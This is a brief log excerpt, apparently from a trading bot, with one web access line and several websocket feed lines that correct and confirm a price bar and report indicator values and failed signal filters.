+2026-06-01 16:21:03  INFO      aiohttp.access — 45.205.1.196 [01/Jun/2026:16:21:03 +0530] "GET / HTTP/1.1" 404 175 "-" "Mozilla/5.0"
+2026-06-01 16:30:00  INFO      feed.ws_feed — [FEED] FIX-PEAK-REST [Delta]: closed bar corrected | true_high=72774.00 true_low=72568.50 true_close=72727.00
+2026-06-01 16:30:00  INFO      feed.ws_feed — ✅ Bar confirmed [WS] | closed_boundary=1780309800000 | new_boundary=1780311600000 | bars=250 — evaluating signals...
+2026-06-01 16:30:00  INFO      main — [BAR] close=72727.00  atr=248.92  adx=26.6  rsi=35.0  trend=True  range=False  filters=FAIL  [atr=True body=False vol=True]
